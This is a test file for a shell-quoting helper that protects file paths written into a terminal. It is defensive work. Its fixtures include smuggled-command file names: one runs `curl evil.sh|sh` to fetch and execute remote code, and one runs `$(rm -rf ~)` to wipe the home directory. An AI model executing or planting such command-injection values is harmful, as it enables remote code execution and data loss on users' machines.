// Shell quoting for a path about to be written into a PTY.
//
// BOTH routes that do that reach a real shell — the terminal drop (where the user presses Enter)
// and the concierge compose box (where `submitPrompt` presses it FOR them, which is worse). So
// these cases are the contract for both; see services/shellQuote's header for why the composer's
// old double-quote rule was not enough (roborev 54369/54375).
import { describe, expect, it } from "vitest";

import { shellQuotePath } from "./shellQuote";

describe("shellQuotePath", () => {
  it("leaves an ordinary path bare and readable", () => {
    expect(shellQuotePath("/Users/me/Downloads/shot.png")).toBe("/Users/me/Downloads/shot.png");
  });

  it("neutralizes command substitution — the case that would EXECUTE on the user's next Enter", () => {
    // Every character here is legal in a macOS filename, and double quotes would not stop it.
    expect(shellQuotePath("/tmp/report`curl evil.sh|sh`.png")).toBe(
      "'/tmp/report`curl evil.sh|sh`.png'",
    );
    expect(shellQuotePath("/tmp/$(rm -rf ~).png")).toBe("'/tmp/$(rm -rf ~).png'");
  });

  it("quotes the token-breaking metacharacters the old double-quote rule ignored entirely", () => {
    expect(shellQuotePath("/tmp/a;b.png")).toBe("'/tmp/a;b.png'");
    expect(shellQuotePath("/tmp/a|b.png")).toBe("'/tmp/a|b.png'");
    expect(shellQuotePath("/tmp/a&b.png")).toBe("'/tmp/a&b.png'");
    expect(shellQuotePath("/tmp/a*b.png")).toBe("'/tmp/a*b.png'");
  });

  it("closes, escapes and reopens an embedded single quote", () => {
    // The one character single quotes cannot contain. Unhandled, it ends the quoted region and
    // swallows the rest of the line.
    expect(shellQuotePath("/tmp/don't.png")).toBe("'/tmp/don'\\''t.png'");
  });

  it("keeps a backslash inert instead of escaping the next character", () => {
    expect(shellQuotePath("/tmp/a\\b.png")).toBe("'/tmp/a\\b.png'");
  });
});
